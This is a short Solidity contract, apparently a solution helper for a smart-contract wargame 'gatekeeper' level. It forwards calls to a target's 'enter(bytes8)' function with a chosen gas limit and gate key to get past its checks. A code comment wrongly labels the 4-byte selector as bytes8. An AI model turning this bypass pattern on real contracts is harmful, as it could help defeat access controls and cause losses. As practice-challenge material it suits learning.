// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

contract GateDestroyer {
  // ENTER_SELECTOR = bytes8(keccak256(bytes("enter(bytes8)")))
  bytes4 constant ENTER_SELECTOR = 0x3370204e;

  function passThrough(
    address gateKeeperAddr,
    uint256 gasLimit,
    bytes8 gateKey
  ) public {
    (bool result, ) =
      gateKeeperAddr.call{ gas: gasLimit }(
        abi.encodeWithSelector(ENTER_SELECTOR, gateKey)
      );
    require(result, "call not success");
  }

  function passThrough(address gateKeeperAddr, bytes8 gateKey) public {
    (bool result, ) =
      gateKeeperAddr.call(abi.encodeWithSelector(ENTER_SELECTOR, gateKey));
    require(result, "call not success");
  }
}
